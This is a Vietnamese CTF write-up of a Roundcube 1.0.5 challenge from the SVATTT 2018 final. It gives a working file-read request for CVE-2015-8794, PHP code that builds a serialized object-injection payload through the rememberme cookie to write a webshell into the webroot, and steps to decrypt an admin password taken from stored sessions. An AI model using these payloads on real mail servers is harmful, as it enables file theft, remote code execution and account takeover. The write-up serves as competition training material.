---
title: "SVATTT final 2018 - roundcube mail"
date: 2018-11-20T22:09:39-05:00
draft: false
comments: true
author: "Kev"
tags: ["ctf", "svattt final 2018"]
---

{{<figure src="/images/uploads/svattt18_final_1.jpg">}}

# Mô tả

> Roundcube 1.0.5 có 3 lỗi  
> Tài khoản: guest/guest  
> Thư mục web /opt/lampp/htdocs  
> Source: [part1](/resources/svattt18/roundcube.part1.rar), [part2](/resources/svattt18/roundcube.part2.rar)

# Ý tưởng

> Lỗi 1: CVE-2015-8794  
> Lỗi 2: PHP Object Injection (cách 2 - cách noob {{<emoji lovemachine>}} )  
> Lỗi 3: Đăng nhập admin  

# Tâm tư của tác giả

Mặc dù theo dòng sự kiện scandal đang nóng hỏi trên facebook nhưng bài này chỉ nói về kỹ thuật không có kích động thù địch gì cả. Tôi writeup bài này sau khi cuộc thi kết thúc và cũng là đội thua cuộc (#2) nên chẳng muốn nói gì hơn là ngậm ngùi :(  
Đề bài không có kỹ thuật mới và không khó nhưng vẫn là dạng bài hay mặc dù 8 tiếng trong cuộc thi attack/defense không đủ để thí sinh làm tất cả các lỗi mà phải bận tâm vào nhiều thứ khác. Nếu có thể gia tăng thời gian lên 2 ngày thì hay quá !!!

# Chi tiết
## Lỗi 1:  CVE-2015-8794

Đọc file `CHANGELOG` ta tìm được version của roundcube là 1.0.5. Có rất nhiều cve nhưng version này khá cũ từ 2015 nên có vẻ CVE-2015-X sẽ hợp lý hơn

{{<figure src="/images/uploads/svattt18_final_02.jpg">}}

{{<highlight php "linenos=inline, hl_lines=3, linenostart=83">}}
<?php //program/steps/addressbook/photo.inc
// deliver alt image
if (!$data && ($alt_img = rcube_utils::get_input_value('_alt', rcube_utils::INPUT_GPC)) && is_file($alt_img)) {
    $data = file_get_contents($alt_img);
}
{{</highlight>}}

Mục addressbook ở `/?_task=addressbook` nhận request tham số `_alt` mà không filter dữ liệu đầu vào, dẫn đến đọc bất kì file nào thông qua file_get_contents
Lỗi này đơn giản nên tôi không nói kỹ, payload khai thác như sau:

```
GET /?_task=addressbook&_photo=21542765594039404100&_source=collected&_action=photo&_alt=/opt/lampp/htdocs/config/config.inc.php HTTP/1.1
Host: proxy.svattt2018.com
Cookie: roundcube_sessid=9gi796bomddm9otl585hssa1t5; XDEBUG_SESSION=1; roundcube_sessauth=S9184f9910452f5bb647294adcfacbd34bc8aa5d2; language=en_US
Connection: close
```

## Lỗi 2: PHP Object Injection

Tôi phát hiện lỗi này bằng cách tìm theo keyword `unserialize`, challenge sử dụng rất nhiều hàm nguy hiểm nhưng yêu cầu cần phải có gadget để thực thi được payload đó là hàm _destruct và _wakeup. Tiếp tục tìm 2 keyword đó thì tìm được 2 vị trí đáng chú ý.

{{<highlight php "linenos=inline, hl_lines=4, linenostart=49">}}
<?php //program/lib/Roundcube/rcube_image.php
function __destruct()
{
    echo file_get_contents("<img src='data:image/jpeg;base64,'".base64_encode($this->image_file)." />");
}
{{</highlight>}}
{{<highlight php "linenos=inline,hl_lines=5,linenostart=14">}}
<?php //plugins/auto_address/auto_address.php
public function __destruct()
{
    if (isset($this->_fn_close)) {
        call_user_func($this->_fn_close);
    }
}
{{</highlight>}}


Tôi mất xíu thời gian để xây dựng payload cho gadget file rcube_image.php nhưng rồi nhận ra dòng code này luôn luôn sai và không bao giờ được chạy đúng {{<emoji burn_joss_stick>}}
Với gadget 2 ta có thể gọi bất kì function nào mà không dùng parameter. Có vẻ không có function có thể exploit mà không cần truyền param cả, hoặc là có mà bạn phát hiện thì hãy comment phía dưới để chỉ tôi biết. Nếu đây là nơi mà tác giả dẫn dắt ta đến thì có vẻ sẽ có 1 function nào đó đã được định nghĩa trước để ta exploit. Tiếp tục tìm kiếm.

{{<highlight php "linenos=inline,hl_lines=4,linenostart=106">}}
<?php //plugins/auto_address/auto_address.php
public function log(){
    try{
        file_put_contents($this->logfile,$this->content);
    }catch (Exception $e){
        echo "[Auto_address]: Can't log!";
    }
}
{{</highlight>}}

À, lên shell được rồi, chỉ cần thay đổi được biến logfile, content và _fn_close là xong. Quay trở lại vị trí sử dụng hàm unserialize để áp payload vào.

{{<highlight php "linenos=inline,linenostart=89">}}
<?php //plugins/rememberme/rememberme.php
function authenticate($args)
{
	...
	// use only-cookie mechanic to identify the user.
    $user_info = unserialize(base64_decode($_COOKIE[$this->cookie_name]));
    ...
	return $args;
}
{{</highlight>}}

Đây là function chức năng remember. Khi login mà check vào ô remember thì một số thông tin cần thiết sẽ được serialize và lưu vào trình duyệt biến `_pt`. Khi trình duyệt tắt và mở lại, dữ liệu này sẽ được gửi lên server trong trường cookie và mọi session được phục hồi như lúc chưa tắt trình duyệt. Vậy nếu ta áp payload ở đây thì sẽ được unserialize dữ liệu đó.
Dữ kiện đã đầy đủ, xây dựng payload thôi. Đến đây thế giới như chia làm 2, build payload rất dễ, vài dòng code thôi các bạn có thể tự build. Nhưng tôi muốn các bạn biết 1 cách khác, khó hơn, try hard hơn và ... điên khùng hơn {{<emoji boss>}}
Tóm tắt các bước là:  
 - Debug để tìm plugin rememberme load ở vị trí nào trong framework  
 - Object auto_address không thể serialize vì nó là PDO object. Dùng trick để có thể serialize  
 - Biến logfile, content, _fn_close là private. Sử dụng php reflection để set giá trị  

```
index.php:42			$RCMAIL = rcmail::get_instance($GLOBALS['env']);
rcmail.php:77			self::$instance->startup();
rcmail.php:127			this->plugins->load_plugins((array)$this->config->get('plugins', array()), array('filesystem_attachments', 'jqueryui'));
rcube_plugin_api.php:139    $this->load_plugin($plugin_name); // $plugin_name="auto_addrses"
```

Quá trình debug như trên, và tôi thêm 1 đoạn code để bypass những bước liệt kê ở trên ở dòng 200 trong function load_plugin

{{<highlight php "linenos=inline">}}
<?php
if ($plugin_name == "auto_address"){
    $myClassReflection = new ReflectionClass(get_class($plugin));
    //
    $logfile = $myClassReflection->getProperty('logfile');
    $logfile->setAccessible(true);
    $logfile->setValue($plugin, "/opt/lampp/htdocs/shell.php");
    //
    $content = $myClassReflection->getProperty('content');
    $content->setAccessible(true);
    $content->setValue($plugin, "<?php echo 'Lên shell rồi nhé !!!';");
    //
    $_fn_close = $myClassReflection->getProperty('_fn_close');
    $_fn_close->setAccessible(true);
    $_fn_close->setValue($plugin, array('auto_address', 'log'));
    //
    $x = serialize($plugin);
    echo base64_encode($x);
}
{{</highlight>}}

Và thêm function __sleep() để object có thể serialize vào class auto_address

{{<highlight php "linenos=inline">}}
<?php
function __sleep(){
	return array('logfile', 'content', '_fn_close');
}
{{</highlight>}}

Làm xong lỗi này tôi cảm thấy challenge này hay nhưng chợt nhận ra mình sai sai ở đâu đó. Khuyến nghị không áp dụng ở nhà vì nó quá điên khùng và mất thời gian {{<emoji beat_plaster >}}

## Lỗi 3: Đăng nhập admin

Audit source hay vào mysql dễ dàng nhận thấy có 2 user là guest và mailadmin, tác giả cho đăng nhập guest thì đoán flow của bài này là đăng nhập admin. 
Với tài khoản mysql cho trong file config.inc.php `$config['db_dsnw'] = 'mysql://roundcube:asdf%401234@localhost/roundcube';` tôi đăng nhập lấy được session của bot đăng nhập admin trong bảng session

```
$ echo bGFuZ3VhZ2V8czo1OiJlbl9VUyI7c2tpbnxzOjY6Im1hYm9sYSI7aW1hcF9uYW1lc3BhY2V8YTo0OntzOjg6InBlcnNvbmFsIjthOjE6e2k6MDthOjI6e2k6MDtzOjA6IiI7aToxO3M6MToiLiI7fX1zOjU6Im90aGVyIjtOO3M6Njoic2hhcmVkIjtOO3M6NjoicHJlZml4IjtzOjA6IiI7fWltYXBfZGVsaW1pdGVyfHM6MToiLiI7dXNlcl9pZHxzOjE6IjIiO3VzZXJuYW1lfHM6NToiZ3Vlc3QiO3N0b3JhZ2VfaG9zdHxzOjk6ImxvY2FsaG9zdCI7c3RvcmFnZV9wb3J0fGk6MTQzO3N0b3JhZ2Vfc3NsfE47cGFzc3dvcmR8czoyNDoiY3BqemgwUHU4b0ljSWRKb2VTWkUyZz09Ijtsb2dpbl90aW1lfGk6MTU0Mjc3NDI2Nzt0YXNrfHM6NDoibWFpbCI7aW1hcF9ob3N0fHM6OToibG9jYWxob3N0IjttYm94fHM6NToiSU5CT1giO3BhZ2V8aToxO3NvcnRfY29sfHM6MDoiIjtzb3J0X29yZGVyfHM6NDoiREVTQyI7U1RPUkFHRV9USFJFQUR8YTozOntpOjA7czoxMDoiUkVGRVJFTkNFUyI7aToxO3M6NDoiUkVGUyI7aToyO3M6MTQ6Ik9SREVSRURTVUJKRUNUIjt9U1RPUkFHRV9RVU9UQXxiOjA7U1RPUkFHRV9MSVNULUVYVEVOREVEfGI6MTtsaXN0X2F0dHJpYnxhOjQ6e3M6NDoibmFtZSI7czo4OiJtZXNzYWdlcyI7czoyOiJpZCI7czoxMToibWVzc2FnZWxpc3QiO3M6NToiY2xhc3MiO3M6NDg6InJlY29yZHMtdGFibGUgbWVzc2FnZWxpc3Qgc29ydGhlYWRlciBmaXhlZGhlYWRlciI7czoxNToib3B0aW9uc21lbnVpY29uIjtzOjQ6InRydWUiO31za2luX3BhdGh8czoxMToic2tpbnMvbGFycnkiO3Vuc2Vlbl9jb3VudHxhOjI6e3M6NToiSU5CT1giO2k6MDtzOjQ6IlNlbnQiO2k6MDt9 | base64 -d
> language|s:5:"en_US";skin|s:6:"mabola";imap_namespace|a:4:{s:8:"personal";a:1:{i:0;a:2:{i:0;s:0:"";i:1;s:1:".";}}s:5:"other";N;s:6:"shared";N;s:6:"prefix";s:0:"";}imap_delimiter|s:1:".";user_id|s:1:"1";username|s:9:"mailadmin";storage_host|s:9:"localhost";storage_port|i:143;storage_ssl|N;password|s:32:"VXcHgXdbjUag0qskGVDSRWl1jAmgZvCV";login_time|i:1542768863;timezone|s:16:"America/New_York";task|s:4:"mail";imap_host|s:9:"localhost";mbox|s:5:"INBOX";page|i:1;sort_col|s:7:"subject";sort_order|s:4:"DESC";STORAGE_THREAD|a:3:{i:0;s:10:"REFERENCES";i:1;s:4:"REFS";i:2;s:14:"ORDEREDSUBJECT";}STORAGE_QUOTA|b:0;STORAGE_LIST-EXTENDED|b:1;list_attrib|a:5:{s:4:"name";s:8:"messages";s:2:"id";s:11:"messagelist";s:5:"class";s:48:"records-table messagelist sortheader fixedheader";s:15:"optionsmenuicon";s:4:"true";s:7:"columns";a:8:{i:0;s:7:"threads";i:1;s:7:"subject";i:2;s:6:"status";i:3;s:6:"fromto";i:4;s:4:"date";i:5;s:4:"size";i:6;s:4:"flag";i:7;s:10:"attachment";}}skin_path|s:11:"skins/larry";folders|a:1:{s:5:"INBOX";a:2:{s:3:"cnt";i:0;s:6:"maxuid";i:0;}}unseen_count|a:1:{s:5:"INBOX";i:0;}
```

Trong đây có chứa password admin là `VXcHgXdbjUag0qskGVDSRWl1jAmgZvCV` nhưng có vẻ bị mã hóa rồi. Bước tiếp là tìm function decrypt trong roundcube để giải mã

{{<highlight php "linenos=inline, linenostart=840">}}
<?php //program/lib/Roundcube/rcube.php
public function decrypt($cipher, $key = 'des_key', $base64 = true)
{
    if (!$cipher) {
        return '';
    }

    $cipher = $base64 ? base64_decode($cipher) : $cipher;

    if (function_exists('mcrypt_module_open') &&
        ($td = mcrypt_module_open(MCRYPT_TripleDES, "", MCRYPT_MODE_CBC, ""))
    ) {
        $iv_size = mcrypt_enc_get_iv_size($td);
        $iv = substr($cipher, 0, $iv_size);

        // session corruption? (#1485970)
        if (strlen($iv) < $iv_size) {
            return '';
        }

        $cipher = substr($cipher, $iv_size);
        mcrypt_generic_init($td, $this->config->get_crypto_key($key), $iv);
        $clear = mdecrypt_generic($td, $cipher);
        mcrypt_generic_deinit($td);
        mcrypt_module_close($td);
    }
    else {
        @include_once 'des.inc';

        if (function_exists('des')) {
            $des_iv_size = 8;
            $iv = substr($cipher, 0, $des_iv_size);
            $cipher = substr($cipher, $des_iv_size);
            $clear = des($this->config->get_crypto_key($key), $cipher, 0, 1, $iv);
        }
        else {
            self::raise_error(array(
                'code' => 500, 'type' => 'php',
                'file' => __FILE__, 'line' => __LINE__,
                'message' => "Could not perform decryption; make sure Mcrypt is installed or lib/des.inc is available"
                ), true, true);
        }
    }

    /*-
     * Trim PHP's padding and the canary byte; see note in
     * rcube::encrypt() and http://php.net/mcrypt_generic#68082
     */
    $clear = substr(rtrim($clear, "\0"), 0, -1);

    return $clear;
}
{{</highlight>}}

Viết lại 1 function tương tự ở bên dưới file đó là xong.
{{<highlight php "linenos=inline">}}
<?php
function decrypt($cipher='VXcHgXdbjUag0qskGVDSRWl1jAmgZvCV', $key = 'HLxz-oU8UnnTY-es5Kc_%$f!', $base64 = true)
{
    $cipher = base64_decode($cipher);

    if (function_exists('mcrypt_module_open') &&
        ($td = mcrypt_module_open(MCRYPT_TripleDES, "", MCRYPT_MODE_CBC, ""))
    ) {
        $iv_size = mcrypt_enc_get_iv_size($td);
        $iv = substr($cipher, 0, $iv_size);

        // session corruption? (#1485970)
        if (strlen($iv) < $iv_size) {
            return '';
        }

        $cipher = substr($cipher, $iv_size);
        mcrypt_generic_init($td, $key, $iv);
        $clear = mdecrypt_generic($td, $cipher);
        mcrypt_generic_deinit($td);
        mcrypt_module_close($td);
    }
    $clear = substr(rtrim($clear, "\0"), 0, -1);
    echo $clear;
}
{{</highlight>}}

Vậy lấy được password admin, đăng nhập admin sẽ được flag vì trong file index.php có đoạn code sau:

{{<highlight php "linenos=inline">}}
<?php //index.php
if($_SESSION['username']==='mailadmin'){
    $OUTPUT->show_message($RCMAIL->config->get('flag'));
}
{{</highlight>}}
